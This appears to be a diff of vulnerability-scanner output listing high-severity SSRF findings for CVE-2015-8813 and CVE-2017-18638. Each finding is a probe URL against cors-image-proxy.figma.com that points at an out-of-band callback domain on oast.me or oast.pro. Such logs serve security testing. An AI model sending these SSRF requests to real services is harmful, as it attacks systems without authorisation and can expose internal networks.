@@ -1,2 +1,2 @@
-[CVE-2015-8813] [http] [high] https://cors-image-proxy.figma.com/Umbraco/feedproxy.aspx?url=http://cnev5o91p8ebofaqhs2gohccydzwyn5r1.oast.me
-[CVE-2017-18638] [http] [high] https://cors-image-proxy.figma.com/composer/send_email?to=RtGx@isZL&url=http://cnev5o91p8ebofaqhs2g4ept8hcrw3953.oast.me
+[CVE-2015-8813] [http] [high] https://cors-image-proxy.figma.com/Umbraco/feedproxy.aspx?url=http://cnfd6ih1p8eboao96s70hig1zkkbyujdj.oast.pro
+[CVE-2017-18638] [http] [high] https://cors-image-proxy.figma.com/composer/send_email?to=vySd@qVzY&url=http://cnfd6ih1p8eboao96s70zbzg43f8qcbs8.oast.pro
